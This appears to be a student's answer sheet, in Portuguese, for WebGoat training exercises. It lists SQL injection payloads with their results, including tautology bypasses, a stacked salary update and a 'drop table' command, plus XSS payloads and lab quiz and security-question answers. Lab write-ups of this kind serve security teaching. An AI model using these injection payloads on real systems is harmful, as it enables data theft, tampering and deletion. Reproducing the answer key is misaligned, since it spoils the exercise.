#P1.1

Passos seguidos para a reallização da pergunta por ordem de execução:

2)  select department from employees where userid=96134;  
	Resultado: Department markting  
	
3) update employees set department='Sales' where first_name='Tobi';  
 	Resultado: 89762  Tobi  Barnett  Sales  77000  TA9LL1  
 	
4) alter table employees add phone varchar(20);  
	Resultado:  ALTER TABLEemployees ADD phone varchar(20)
	
5) GRANT ALTER TABLE TO 'UnauthorizedUser';  
	Resultado:  GRANT ALTER TABLE TO UnauthorizedUser
	
9) SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1';  
	Resultado:  Toda a user_data porque  '1' = '1' é sempre verdade
	
10) SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1;  
	Resultado:  toda a user_data porque  1 = 1 é sempre verdade
	
11) ' OR '1' = '1;    
	Resultado: "You have succeeded!You have successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!"
	
12) '; update employees set salary = 120000 where first_name = 'John
	Resultado:  salario de todos os Johns modificado
	
13) ';drop table access_log;'
	Resultado: tabela apagada



#P2.1

2) Sim. As cookies eram as mesmas.
	
7) ```<script>alert("XSS")</script>  ```  
	Resultado: O campo "Enter your credit card number" era vulnerável
	

10)
  
1. Abrir o Debugger no browser
2. encontrar o ficheiro goatApp/View/GoatRouter.js
3. Inserir na caixa da rota 'test/:param':'testRoute'. o comando start.mvc#test  

	
11) Inserir o URL ```http://localhost:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript> ``
	Resultado: phone home said {"lessonCompleted":true,"feedback":"Congratulations. You have successfully completed the ass<ignment.","output":"phoneHome Response is 1177239543"}
	
12) 
	1. Solução 4
	2. Solução 3
	3. Solução 1
	4. Solução 2
	5. Solução 4

	
	
#P3

1. "There was an errorwhile sending email. Is webwolf running?"

2. Autenticação:
	1. username: admin; favorite color: green 
	2. username: jerry; favorite color: orange
	3. username: tom;   favorite color: purple







#P4

